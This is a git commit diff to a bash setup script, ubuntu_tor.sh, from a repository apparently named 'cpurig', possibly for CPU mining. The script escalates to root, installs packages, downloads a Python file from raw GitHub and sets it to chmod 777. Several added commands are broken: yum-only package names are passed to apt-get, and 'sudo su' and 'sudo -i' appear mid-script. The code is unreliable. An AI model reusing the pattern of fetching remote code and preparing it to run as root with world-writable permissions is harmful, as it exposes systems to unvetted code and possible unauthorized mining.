e256da6edbd549907ba3a1ea684c2771d248f5b5
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-11-22 16:48:17 +0700

    Update ubuntu_tor.sh

--- ubuntu_tor.sh
+++ ubuntu_tor.sh
@@ -1,6 +1,17 @@
 #!/bin/bash
+if [ "$(id -u)" != "0" ]; then
+   sudo su   
+else
+	echo "Root user"
+fi
+sudo -i
+apt-get update
 apt-get install -y git wget screen
 apt-get install -y python python-dev
+apt-get install -y epel-release
+apt-get install -y python-pip
+apt-get install -y gcc-c++
+pip install sh
 rm -rf ubuntu_tor_docker.py
 wget https://raw.githubusercontent.com/ts6aud5vkg/cpurig/master/ubuntu_tor_docker.py
 chmod 777 ubuntu_tor_docker.py
